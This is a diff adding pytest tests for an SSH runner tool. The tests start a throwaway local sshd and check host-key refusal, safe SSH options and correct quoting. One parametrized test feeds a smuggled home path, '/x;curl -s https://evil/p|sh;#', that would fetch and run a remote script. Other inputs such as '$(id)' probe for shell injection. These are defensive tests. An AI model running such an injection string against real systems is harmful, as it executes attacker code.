@@ -352,3 +352,136 @@ def test_stop_all_names_a_host_it_could_not_reach(
     code = cli.main(["runner", "stop-all", "--config", str(tmp_path / "runner.toml")])
     out = capsys.readouterr().out
     assert code == 1 and "could not reach build-2" in out
+
+
+# --- against a real sshd on localhost --------------------------------------------------------
+
+
+SSHD = Path("/usr/sbin/sshd")
+
+
+@pytest.fixture
+def real_sshd(tmp_path: Path) -> Any:
+    """A throwaway sshd on 127.0.0.1 for this user, with its own host key and a key file for
+    the client; stopped by its own pid. Skipped where sshd or ssh-keygen is missing."""
+    import signal
+    import socket
+    import subprocess
+    import time
+
+    if not SSHD.exists() or shutil_which("ssh-keygen") is None:
+        pytest.skip("needs sshd and ssh-keygen")
+    keys = tmp_path / "sshd"
+    keys.mkdir(mode=0o700)
+    for name in ("host", "client"):
+        subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-f", str(keys / name)],
+                       check=True)  # fmt: skip
+    (keys / "authorized_keys").write_text((keys / "client.pub").read_text())
+    with socket.socket() as s:
+        s.bind(("127.0.0.1", 0))
+        port = s.getsockname()[1]
+    conf = keys / "sshd_config"
+    conf.write_text(
+        f"Port {port}\nListenAddress 127.0.0.1\nHostKey {keys / 'host'}\n"
+        f"PidFile {keys / 'pid'}\nAuthorizedKeysFile {keys / 'authorized_keys'}\n"
+        "UsePAM no\nStrictModes no\nPasswordAuthentication no\nKbdInteractiveAuthentication no\n"
+    )
+    proc_ = subprocess.Popen([str(SSHD), "-D", "-e", "-f", str(conf)],  # noqa: S603
+                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # fmt: skip
+    try:
+        for _ in range(50):
+            try:
+                socket.create_connection(("127.0.0.1", port), timeout=0.2).close()
+                break
+            except OSError:
+                time.sleep(0.1)
+        else:
+            pytest.skip("sshd did not start")
+        known = tmp_path / "known_hosts"
+        host_key = (keys / "host.pub").read_text().split()[:2]
+        known.write_text(f"[127.0.0.1]:{port} {' '.join(host_key)}\n")
+        yield port, keys / "client", known
+    finally:
+        proc_.send_signal(signal.SIGTERM)  # exactly this sshd
+        proc_.wait(timeout=10)
+
+
+def shutil_which(name: str) -> str | None:
+    import shutil
+
+    return shutil.which(name)
+
+
+def real_host(tmp_path: Path, port: int, key: Path, known: Path) -> Ssh:
+    import getpass
+    import tempfile
+
+    # A unix socket path is at most 107 bytes; pytest's own directories are longer.
+    control = Path(tempfile.mkdtemp(prefix="ms", dir="/tmp"))
+    return Ssh(name="local", address="127.0.0.1", login=getpass.getuser(), port=port,
+               known_hosts=known, identity=str(key), control_dir=control)  # fmt: skip
+
+
+def test_a_real_host_is_reached_and_every_word_arrives_as_it_is(
+    tmp_path: Path, real_sshd: Any
+) -> None:
+    host = real_host(tmp_path, *real_sshd)
+    assert host.home() == Path(os.path.expanduser("~"))
+    words = ["a b", "$(id)", "x;y", "'q'"]
+    done = host.run(["printf", "%s\n", *words])
+    assert done.returncode == 0 and done.stdout.splitlines() == words
+    value = "$(id); `id` 'x'"
+    assert host.run(["printenv", "V"], env={"V": value}).stdout.strip() == value
+
+
+def test_a_real_host_with_an_unknown_key_is_refused(tmp_path: Path, real_sshd: Any) -> None:
+    port, key, known = real_sshd
+    known.write_text("")  # the host's key is not in the runner's known_hosts
+    with pytest.raises(Unreachable):
+        real_host(tmp_path, port, key, known).home()
+
+
+def test_the_control_directory_is_made_for_the_hosts(tmp_path: Path) -> None:
+    cfg = load(tmp_path)
+    targets.ssh_hosts(cfg)
+    control = tmp_path / "st" / "ssh"
+    assert control.is_dir() and (control.stat().st_mode & 0o777) == 0o700
+
+
+@pytest.mark.parametrize("home", ["/x;curl -s https://evil/p|sh;#", "relative", "/a b", "/a/../b"])
+def test_a_home_that_is_not_a_plain_path_refuses_the_host(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, home: str
+) -> None:
+    import subprocess
+
+    host = Ssh(name="build-1", address="b1.lan", login="maity", known_hosts=tmp_path / "k")
+    monkeypatch.setattr(Ssh, "run", lambda self, argv, **kw: subprocess.CompletedProcess(
+        argv, 0, home + "\n", ""))  # fmt: skip
+    with pytest.raises(OSError, match="not a plain absolute path"):
+        host.home()
+
+
+def test_the_attach_hint_quotes_every_word(tmp_path: Path, fake_ssh: Path) -> None:
+    sup, _, _, _, _ = remote_world(tmp_path, fake_ssh)
+    hint = sup.targets["build-2"].attach_hint("maity_maity_agent-3")
+    assert shlex.split(hint)[:5] == ["ssh", "-t", "-p", "2222", "maity@b2.lan"]
+    assert shlex.split(hint)[-2:] == ["-t", "maity_maity_agent-3"]
+
+
+def test_the_operators_ssh_configuration_cannot_forward_or_run_local_commands(
+    tmp_path: Path,
+) -> None:
+    options = Ssh(name="b", address="b.lan", login="m", known_hosts=tmp_path / "k").ssh()
+    for option in ("ClearAllForwardings=yes", "PermitLocalCommand=no", "ServerAliveInterval=15"):
+        assert option in options
+
+
+def test_check_refuses_a_state_dir_too_long_for_sshs_sockets(
+    tmp_path: Path, fake_ssh: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    deep = tmp_path / ("d" * 60)
+    path = tmp_path / "runner.toml"
+    path.write_text(CONFIG.format(root=tmp_path).replace(f"{tmp_path}/st", str(deep)))
+    deep.mkdir(mode=0o700)
+    cli.main(["runner", "check", "--offline", "--config", str(path)])
+    assert "too long for ssh's connection sockets" in capsys.readouterr().out
